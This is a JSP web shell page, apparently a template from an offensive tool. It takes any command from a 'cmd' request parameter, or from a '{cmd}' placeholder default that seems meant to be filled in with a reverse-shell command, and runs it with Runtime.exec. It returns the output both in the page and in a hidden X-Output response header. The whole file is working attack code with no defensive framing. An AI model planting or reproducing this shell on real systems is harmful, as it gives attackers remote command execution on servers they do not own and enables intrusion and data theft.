<html>
<head>
    <title>Web Shell</title>
</head>
<body>
    <h1>Web Shell</h1>
<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%
    String reverse_cmd = "{cmd}";
    String cmd = request.getParameter("cmd");
    if (cmd == null || cmd.trim().length() == 0) {
        cmd = reverse_cmd;
    }
    String output = "";
    String output_x = "";
    if (cmd != null) {
        try {
            // Runtime.exec() handles cross-platform automatically
            Process p = null;
            if (cmd.startsWith("{") && cmd.endsWith("}")) {
                cmd = cmd.substring(1, cmd.length() - 1); // remove { and }
                String[] cmd_array = cmd.split(",");
                for (int i = 0; i < cmd_array.length; i++) {
                    cmd_array[i] = cmd_array[i].trim().replaceAll("^\"|\"$", "");
                }
                p = Runtime.getRuntime().exec(cmd_array);
            } else {
                p = Runtime.getRuntime().exec(cmd);
            }
            
            // Read stdout
            BufferedReader stdOut = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = stdOut.readLine()) != null) {
                output += line + "<br>";
                output_x += line + "\n";
            }
            
            // Read stderr
            BufferedReader stdErr = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            while ((line = stdErr.readLine()) != null) {
                output += line + "<br>";
                output_x += line + "\n";
            }
            
            int exitCode = p.waitFor();
            if (exitCode != 0) {
                output += "Exit code: " + exitCode + "<br>";
                output_x += "Exit code: " + exitCode + "\n";
            }
            
            stdOut.close();
            stdErr.close();
            
        } catch (Exception e) {
            output += "Error: " + e.getMessage() + "<br>";
            output_x += "Error: " + e.getMessage() + "\n";

        }
        finally {
            response.setHeader("X-Output", output_x);
        }   
    }
%> 
<pre>
<%=output %>
</pre>   
</body>
</html>